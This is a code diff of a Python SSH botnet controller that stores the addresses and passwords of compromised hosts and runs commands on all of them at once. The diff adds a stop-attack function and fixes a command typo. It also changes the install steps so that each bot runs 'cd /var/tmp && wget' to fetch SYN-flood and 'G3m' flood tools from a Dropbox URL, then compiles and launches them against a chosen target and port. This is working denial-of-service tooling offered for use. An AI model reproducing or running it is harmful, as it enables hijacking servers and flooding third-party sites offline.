@@ -3,7 +3,6 @@
 #Version 1.0
 #Copyright (c) 2014 Mh4-(msfcd3r)
 #by Mharcos Nesster
-#email:mh4root@gmail.com
 #Permission is hereby granted, free of charge, to any person obtaining a copy of
 #this software and associated documentation files (the "Software"), to deal in
 #the Software without restriction, including without limitation the rights to
@@ -20,6 +19,7 @@
 #COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 #IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 #CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+#Update 23/05/2014
 import pxssh
 import os
 import sys
@@ -66,7 +66,7 @@ def banner():
    |use menu                         Show Menu Incial :D;             |
    |use create [host] [user] [pass]  Create or add a new BOT;         |
    |use add_Attack                   Add the bot to attack;           |
-   |use set-command [command]         Run the command ALL BOT;         |
+   |use set-command [command]        Run the command ALL BOT;         |
    |use delete_all                   Delete all BOT of Database;      |
    |use delete [id]                  Clear ID for the database;       |
    |use encrypt  [key]               Encrypt the data of the Bank;    |
@@ -75,6 +75,7 @@ def banner():
    |use install_g3m                  Install G3m for attack;          |
    |use attack_start [target][port]  Attack SYN flood all BOT;        |
    |use attack_g3m   [target][port]  Attack G3m website Turbo;        |
+   |use kill_Attack                  Stop Attack in Target;           |
    |use clear_install                Delete all tool installed in BOT;|
    +------------------------------------------------------------------+  
 """%(RES,ENDC,GREEN,ENDC))
@@ -104,7 +105,7 @@ class Client:
 
         return e
     def logout(self):
-        self.s.terminate()
+        self.s.terminate(True)
         main()
  
     def send_command(self, cmd):
@@ -138,13 +139,13 @@ def g3m(command):
 
 def attackSYN(host,porta):
     for client in botNet:
-        print("[*] Pess Ctrl + C for pause %sattack%s"%(RED,ENDC))
+        print("[*] Starting %sattack%s wait..."%(RED,ENDC))
         print("[!] Attacking %s on port %s!"%(host,porta))
         output = client.send_command("python flood.py %s %s "%(host,porta))
 
 def attackg3m(host,porta):
     for client in botNet:
-        print("[*] Pess Ctrl + C for pause %sattack%s"%(RED,ENDC))
+        print("[*] Starting %sattack%s wait..."%(RED,ENDC))
         print("[!] Attacking %s on port %s!"%(host,porta))
         output = client.send_command("gcc -o flood g3m.c")
         output = client.send_command("./flood -h %s -T 3 -p %s,%s "%(host,porta,porta))
@@ -160,6 +161,13 @@ def clear():
         output = client.send_command("rm flood.py")
         print output
  
+def desconnect():
+    for client in botNet:
+        print("[*] Stop Attack  %sServer%s"%(RED,ENDC))
+        print("[%sOK%s] Desconnect all BOT!"%(GREEN,ENDC))
+        aut = client.logout()
+
+
 def addClient(host, user, password):
     stop = 0
     f2 = open("Modulo/conf.bot","w")
@@ -176,9 +184,6 @@ def addClient(host, user, password):
 
 
 
-def desconectar(host, user, password):
-    stop = 1
-    client = Client(host, user, password,stop)
 
 def criartabela():
     c.execute("CREATE TABLE IF NOT EXISTS database_bot (id integer PRIMARY KEY AUTOINCREMENT, ipadress text, usuario text,datestamp text, senha text)")
@@ -248,9 +253,9 @@ def muda():
     print("invalid command!")
 
 def main():
-    escolha = {"use menu": banner,"use add_Attack": add_bot, "use status": status_bot, "use delete_all": delete_bot, "use set-commad" : comando_bot}
+    escolha = {"use kill_Attack": desconnect,"use menu": banner,"use add_Attack": add_bot, "use status": status_bot, "use delete_all": delete_bot, "use set-command" : comando_bot}
     while True:
-        COMMANDS = ['menu','add_Attack','clear_install','install_g3m','attack_g3m','attack_start','install_flood','use','delete', 'status', 'delete_all', 'set-commad','create', 'encrypt' , 'descrypt','clear']
+        COMMANDS = ['desconnect','menu','add_Attack','clear_install','install_g3m','attack_g3m','attack_start','install_flood','use','delete', 'status', 'delete_all', 'set-commad','create', 'encrypt' , 'descrypt','clear']
 
         def complete(text, state):
             for cmd in COMMANDS:
@@ -290,10 +295,10 @@ def main():
             attackg3m(target,porta)    
 
         elif search("use install_flood",selecao):
-            comando = "wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
+            comando = "cd /var/tmp && wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
             installSYN(comando)
         elif search("use install_g3m",selecao):
-            comando = "wget https://dl.dropboxusercontent.com/u/97321327/g3m.c"
+            comando = "cd /var/tmp && wget https://dl.dropboxusercontent.com/u/97321327/g3m.c"
             g3m(comando)
 
         elif search("use attack_stop", selecao):
@@ -317,7 +322,7 @@ def main():
             banner()
             main()
 
-        elif search("use set-commad", selecao):
+        elif search("use set-command", selecao):
             bot = selecao[14:]
             comando_bot(bot)
             main()
